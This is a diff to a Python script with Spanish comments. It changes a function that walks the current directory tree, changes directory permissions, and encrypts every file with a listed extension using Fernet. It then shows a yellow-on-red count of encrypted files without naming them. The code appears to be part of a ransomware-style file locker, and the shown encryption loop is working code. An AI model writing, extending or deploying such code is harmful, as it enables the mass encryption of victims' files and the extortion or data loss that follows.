@@ -44,12 +44,18 @@ def encrypt_files():
 
     # Recorre el directorio actual y sus subdirectorios
     for root, directories, filenames in os.walk('.'):
+        # Cambia los permisos del directorio actual
+        try:
+            os.chmod(root, stat.S_IRWXU)
+        except Exception as e:
+            print(f"Error cambiando permisos de directorio {root}: {e}")
+
+        # Cifra los archivos en el directorio actual
         for filename in filenames:
             filepath = os.path.join(root, filename)
             _, file_extension = os.path.splitext(filepath)
             if file_extension.lower() in ALLOWED_EXTENSIONS:
                 try:
-                    os.chmod(filepath, stat.S_IRWXU)  # Cambiar los permisos del archivo
                     with open(filepath, "rb") as thefile:
                         contents = thefile.read()
                     contents_encrypted = Fernet(key).encrypt(contents)
@@ -63,6 +69,7 @@ def encrypt_files():
 
     # Muestra el número total de archivos cifrados sin listar sus nombres
     result_label.config(text=f"Total files encrypted: {total_files_encrypted}", fg="yellow", bg="red")
+
 
 
 
